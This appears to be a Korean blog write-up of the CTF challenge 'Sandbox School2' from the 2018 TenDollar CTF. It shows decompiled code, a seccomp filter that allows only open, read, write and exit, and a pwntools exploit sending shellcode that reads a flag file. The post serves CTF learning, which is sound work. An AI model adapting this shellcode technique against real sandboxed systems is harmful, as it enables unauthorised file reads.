---
title: "2018 TenDollar CTF Sandbox School2"
date: 2020-2-13
ctf: TenDollar CTF
layout: post
---

`install_syscall_filter` 함수에서 prctl함수로 syscall 필터링을 해준다. 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  void *v4; // ST00_8
  void *buf; // [rsp+0h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = mmap(0LL, 4096uLL, 7, 34, -1, 0LL);
  if ( buf == -1LL )
  {
    puts("[err] Please, let me know this issue (hackability@naver.com)");
    result = -1;
  }
  else
  {
    puts("[*] Welcome to sandbox school for beginner!");
    puts("[*] Put your shellcode as binary stream. I'll ready for your input as read(0, shellcode, 1024)");
    puts("[*] Lv   : Goblin");
    puts("[*] Desc : How did you get in here? Get out! :( ?");
    printf("> ", 4096LL, buf);
    alarm(10u);
    read(0, v4, 1024uLL);
    install_syscall_filter();
    (v4)(0LL, v4);
    result = 0;
  }
  return result;
}
```

orw만 이용해서 플래그를 읽어오면 된다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

Simple ORW

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./sb2')
p = process('./sb2')

s='''
mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

add rsp, 1000

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 0x50
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 0x50
syscall
'''
#raw_input()
p.send(asm(shellcraft.pushstr('./flag'))+asm(s))

p.interactive()
```

